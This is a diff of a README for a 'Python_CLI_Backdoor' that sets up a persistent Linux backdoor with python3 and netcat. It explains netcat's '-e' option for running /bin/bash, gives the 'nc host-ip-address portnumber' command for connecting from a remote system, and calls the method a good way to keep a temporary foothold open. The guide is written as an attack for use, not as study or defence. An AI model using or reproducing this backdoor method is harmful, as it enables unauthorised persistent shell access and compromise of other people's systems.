@@ -1,7 +1,9 @@
 # Python_CLI_Backdoor
 
-// This is to create persistant CLI backdoor w/ python
+## Objective
+Create persistant backdoor utilizing python3 and netcat in Linux CLI
 
+## On Host
 ```ruby
 python3
 >>> import os
@@ -16,7 +18,12 @@ python3
 -  -e :allows us to execute commands within /bin/bash
 
 To access this server from a remote system 
+## On Remote System
 ```ruby
-nc ip-address portnumber
+nc host-ip-address portnumber
 ```
 Once you are in you can execute bash commands from remote host to be executed on server
+
+## Considerations
+The only issue with this attack vector is the need to aready have access to host system, however if you manage a temporary backdoor this could be
+a great way to maintain that door open.
